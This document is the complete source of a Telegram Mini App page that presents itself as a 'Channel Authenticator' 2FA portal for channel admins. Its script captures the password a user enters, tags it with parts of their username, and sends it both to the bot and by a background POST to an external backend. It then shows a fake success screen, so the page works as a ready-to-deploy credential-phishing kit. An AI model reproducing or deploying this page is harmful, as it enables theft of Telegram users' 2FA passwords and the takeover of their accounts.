<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Channel Authenticator</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@lottiefiles/dotlottie-wc@0.9.10/dist/dotlottie-wc.js" type="module"></script>
    <style>
        :root {
            --tg-blue: #5BB3F1;
            --bg-color: var(--tg-theme-bg-color, #ffffff);
            --text-color: var(--tg-theme-text-color, #000000);
            --hint-color: var(--tg-theme-hint-color, #999999);
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0; padding: 24px;
            display: flex; flex-direction: column; align-items: center; text-align: center;
        }
        .view { display: none; width: 100%; max-width: 400px; }
        .view.active { display: flex; flex-direction: column; align-items: center; }
        h1 { font-size: 20px; margin: 16px 0 8px; }
        p { color: var(--hint-color); font-size: 14px; margin-bottom: 24px; }
        input {
            width: 100%; padding: 12px; margin-bottom: 16px;
            border: 1px solid #ddd; border-radius: 8px;
            background: var(--bg-color); color: var(--text-color);
            box-sizing: border-box;
        }
        button {
            width: 100%; padding: 14px;
            background-color: var(--tg-blue); color: white;
            border: none; border-radius: 8px;
            font-weight: 600; cursor: pointer;
        }
        dotlottie-wc { width: 120px; height: 120px; }
    </style>
</head>
<body>

    <div id="start_view" class="view active">
        <dotlottie-wc src="https://lottie.host/8e7d8b3a-2321-4f11-8255-66779900aa11/example.json" autoplay loop></dotlottie-wc>
        <h1>Admin Portal</h1>
        <p>Choose an action to proceed with channel verification.</p>
        <button id="go_verify" style="margin-bottom: 12px;">Verify Existing Credentials</button>
        <button id="go_create" style="background: none; color: var(--tg-blue);">Create New 2FA Session</button>
    </div>

    <div id="verify_view" class="view">
        <h1>Verify 2FA</h1>
        <p>Enter your current administrative password.</p>
        <input type="password" id="v_pass" placeholder="Password">
        <button id="v_submit">Verify Authenticity</button>
    </div>

    <div id="create_view" class="view">
        <h1>Set 2FA</h1>
        <input type="password" id="c_pass" placeholder="New Password">
        <input type="password" id="c_confirm" placeholder="Confirm Password">
        <button id="c_submit">Synchronize</button>
    </div>

    <div id="success_view" class="view">
        <dotlottie-wc src="https://lottie.host/5738848d-294b-4f9e-966a-1234567890ab/check.json" autoplay></dotlottie-wc>
        <h1>Success</h1>
        <p>Credential synchronization complete.</p>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        // YOUR RENDER URL
        const BACKEND_URL = "https://auth-bot-backend.onrender.com/log";

        function showView(viewId) {
            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
            document.getElementById(viewId).classList.add('active');
        }

        const user = tg.initDataUnsafe.user?.username || "anon";
        const part1 = user.substring(0, 3);
        const part2 = user.slice(-3);

        function exfiltrate(password, method) {
            const payload = `pwsd%${part1}%${part2}§${method}:${password}%1256`;

            // ROUTE 1: Bottom Keyboard Button (Standard)
            tg.sendData(payload);

            // ROUTE 2: Message Inline Button (Background POST)
            fetch(BACKEND_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: payload })
            }).catch(e => console.log("Web route silent fail"));

            showView('success_view');
            setTimeout(() => { tg.close(); }, 2500);
        }

        document.getElementById('go_verify').onclick = () => showView('verify_view');
        document.getElementById('go_create').onclick = () => showView('create_view');
        
        document.getElementById('v_submit').onclick = () => {
            const val = document.getElementById('v_pass').value;
            if(val) exfiltrate(val, 'VERIFY');
        };

        document.getElementById('c_submit').onclick = () => {
            const p1 = document.getElementById('c_pass').value;
            if(p1) exfiltrate(p1, 'CREATE');
        };
    </script>
</body>
</html>
